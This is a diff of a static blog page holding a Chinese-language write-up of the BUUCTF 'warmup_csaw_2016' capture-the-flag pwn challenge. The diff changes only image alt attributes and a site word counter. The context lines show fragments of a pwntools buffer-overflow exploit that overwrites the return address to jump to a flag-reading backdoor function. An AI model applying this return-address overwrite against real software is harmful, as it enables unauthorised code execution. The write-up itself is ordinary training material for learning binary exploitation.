@@ -432,7 +432,7 @@ from pwn import *
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/1.jpg" alt><br>64位程序，没有保护<br>拖入IDA查看,F5大法<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/2.jpg" alt><br>同样有一个后门函数，这个后门函数直接读取flag<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/3.jpg" alt><br>所以做法和rip一样<br>直接贴exp</p>
+                <p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/1.jpg" alt=""><br>64位程序，没有保护<br>拖入IDA查看,F5大法<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/2.jpg" alt=""><br>同样有一个后门函数，这个后门函数直接读取flag<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/3.jpg" alt=""><br>所以做法和rip一样<br>直接贴exp</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
 <span class="token comment" spellcheck="true">#io = process('./warmup_csaw_2016')</span>
@@ -442,7 +442,7 @@ payload <span class="token operator">=</span> <span class="token string">'A'</sp
 payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/5.jpg" alt><br>成功读取flag</p>
+<p><img src="/LawlietLW.github.io/2020/01/30/buuctf-warmup-csaw-2016/5.jpg" alt=""><br>成功读取flag</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -851,7 +851,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7.2k</span>&nbsp;字
+                class="white-color">11.9k</span>&nbsp;字
             
             
             
